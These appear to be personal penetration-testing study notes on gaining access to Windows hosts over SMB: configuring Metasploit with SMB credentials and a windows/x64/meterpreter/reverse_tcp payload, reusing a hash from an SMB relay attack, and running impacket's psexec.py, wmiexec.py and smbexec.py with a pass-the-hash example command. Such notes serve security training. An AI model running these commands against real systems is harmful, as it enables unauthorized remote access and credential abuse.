#intialAccess

msfconsole
	need to set the following parameters to work 
		rhosts
		smbdomain
		smbuser
		smbpass
		**also changed the payload to x64 system
			ex - windows/x64/meterpreter/reverse_tcp
		can use the hash
		use the hash we got in the SMBrelay attack 
			used the entire hash 
psexec.py (domain/user):'<PasswordL>'@<machine IP>
	can also add without password and it will prompt to type
	can also use a hash
		e x psexec.py admin@192.168.88.101 -hashes <Hash>
wmiexec.py
	if psexec.py doesnt work
smbexec.py
	if psexec.py doesnt work
